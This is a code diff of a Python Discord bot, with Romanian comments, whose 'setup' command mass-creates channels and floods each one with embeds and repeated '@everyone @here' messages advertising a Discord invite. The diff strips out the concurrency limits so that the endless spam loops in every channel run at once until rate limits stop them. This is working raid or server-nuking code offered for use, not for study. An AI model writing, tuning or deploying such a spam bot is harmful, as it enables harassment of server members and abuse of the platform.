@@ -1,3 +1,4 @@
+
 # -*- coding: utf-8 -*-
 import asyncio, base64, json, os, random, time
 from datetime import datetime
@@ -328,22 +329,21 @@ async def setup(ctx):
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale (batch 40)...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
 
-    send_semaphore = asyncio.Semaphore(12)
+    # Elimin semaforul pentru inițiale – lăsăm să ruleze toate în paralel
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def send_initial_messages(channel):
-        async with send_semaphore:
-            try:
-                await channel.send(embed=embed_content)
-                await asyncio.sleep(0.08)
-                ping_count = random.choice(ping_counts)
-                ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
-                await channel.send(content=ping_message)
-                await asyncio.sleep(0.08)
-            except:
-                pass
+        try:
+            await channel.send(embed=embed_content)
+            await asyncio.sleep(0.08)
+            ping_count = random.choice(ping_counts)
+            ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
+            await channel.send(content=ping_message)
+            await asyncio.sleep(0.08)
+        except:
+            pass
 
     async def create_channel(index):
         try:
@@ -373,31 +373,29 @@ async def setup(ctx):
 
     await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")
 
-    # ===== SPAM FINAL PE TOATE CANALELE (până la rate limit) =====
-    await user.send("🔄 Începe spam-ul final pe toate canalele...")
-
-    spam_semaphore = asyncio.Semaphore(15)
+    # ===== SPAM FINAL PE TOATE CANALELE SIMULTAN (FĂRĂ SEMAFOR) =====
+    await user.send("🔄 Începe spam-ul final pe toate canalele simultan...")
 
     async def spam_final(channel):
-        async with spam_semaphore:
-            try:
-                await channel.send(content=big_message)
-                await asyncio.sleep(0.08)
-                await channel.send(embed=embed_content)
-                await asyncio.sleep(0.08)
-                while True:
-                    ping_count = random.randint(5, 12)
-                    msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
-                    await channel.send(content=msg)
-                    await asyncio.sleep(0.06)
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    pass
-                else:
-                    raise
-            except:
+        try:
+            await channel.send(content=big_message)
+            await asyncio.sleep(0.08)
+            await channel.send(embed=embed_content)
+            await asyncio.sleep(0.08)
+            while True:
+                ping_count = random.randint(5, 12)
+                msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
+                await channel.send(content=msg)
+                await asyncio.sleep(0.06)
+        except discord.HTTPException as e:
+            if e.status == 429:
                 pass
+            else:
+                raise
+        except:
+            pass
 
+    # Lansează toate task-urile simultan, fără semafor
     spam_tasks = [spam_final(ch) for ch in created_channels]
     await asyncio.gather(*spam_tasks)
 
